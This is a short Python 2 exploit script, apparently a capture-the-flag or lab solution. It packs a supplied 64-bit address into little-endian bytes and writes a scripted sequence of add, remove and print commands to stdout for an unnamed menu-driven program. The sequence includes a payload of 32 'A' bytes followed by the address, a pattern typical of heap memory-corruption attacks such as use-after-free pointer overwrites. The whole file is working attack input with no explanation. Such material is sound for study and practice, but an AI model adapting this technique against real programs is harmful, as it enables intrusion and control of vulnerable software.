#! /usr/bin/python2

import sys


def pack(word):
    ret = ''
    byte_mask = (0b1 << 8) - 1
    i = 0

    assert (word >> 64) == 0  # 8 byte address
    for j in range(8):
        byte = word & byte_mask
        ret += chr(byte)
        word >>= 8
    return ret


# addr = "\x2e\xde\xff\xff\xff\x7f\x00\x00"
if sys.argv[1][:2] == '0x':
    addr = pack(int(sys.argv[1], 16))
else:
    addr = pack(int(sys.argv[1]))



sys.stdout.write(b"a\nA\n1\n")
sys.stdout.write(b"a\nB\n1\n")

sys.stdout.write(b"r\n2\n")
sys.stdout.write(b"r\n1\n")
# sys.stdout.write(b"a\n" + b'A' * 32 + addr.replace('\x00', '') + '\n1\n')
sys.stdout.write(b"a\n" + b'A' * 32 + addr + '\n1\n')

sys.stdout.write(b"a\nA\n1\n")
sys.stdout.write(b"a\nAAAAAAAAAAAAAA0crypters\n1\n")

sys.stdout.write(b"p\n")
# sys.stdout.write(b"r\n3\n")

sys.stdout.write(b"x\n")
